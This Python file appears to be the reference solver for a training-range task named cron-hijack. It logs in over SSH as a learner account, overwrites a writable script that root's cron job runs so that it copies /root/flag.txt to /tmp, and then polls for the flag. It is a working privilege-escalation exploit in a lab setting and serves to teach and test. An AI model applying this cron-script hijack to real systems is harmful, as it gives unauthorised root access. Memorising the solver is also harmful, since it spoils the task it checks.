"""Intended-path solver: hijack the root cron job through the writable directory."""

import time
import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

DROP_SCRIPT = (
    "rm -f /usr/local/sbin/cleanup.sh"
    " && printf '%s\\n' '#!/bin/sh' 'cp /root/flag.txt /tmp/flag'"
    " 'chmod 644 /tmp/flag' > /usr/local/sbin/cleanup.sh"
    " && chmod 755 /usr/local/sbin/cleanup.sh"
)
READ_FLAG = "cat /tmp/flag 2>/dev/null"
POLL_SECONDS = 70
POLL_INTERVAL = 5


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    try:
        _, stdout, stderr = client.exec_command(DROP_SCRIPT, timeout=15)
        code = stdout.channel.recv_exit_status()
        err = stderr.read().decode(errors="replace")
        if code != 0:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="cron-hijack",
                        ok=False,
                        captured=None,
                        detail=f"could not replace cleanup.sh (rc={code}): {err[:200]}",
                    )
                ]
            )

        deadline = time.monotonic() + POLL_SECONDS
        captured = None
        out = ""
        while time.monotonic() < deadline:
            _, stdout, stderr = client.exec_command(READ_FLAG, timeout=10)
            out = stdout.read().decode(errors="replace")
            flags = find_flags(out)
            if flags:
                captured = flags[0]
                break
            time.sleep(POLL_INTERVAL)
    finally:
        client.close()

    return SolveResult(
        results=[
            TaskResult(
                task_id="cron-hijack",
                ok=bool(captured),
                captured=captured,
                detail=None
                if captured
                else f"cron did not deliver /tmp/flag in {POLL_SECONDS}s: {out[:200]}",
            )
        ]
    )
